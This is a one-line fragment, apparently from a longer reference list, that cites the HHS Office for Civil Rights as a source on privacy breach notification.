- **Reference:** HHS Office for Civil Rights - Privacy Breach Notification

---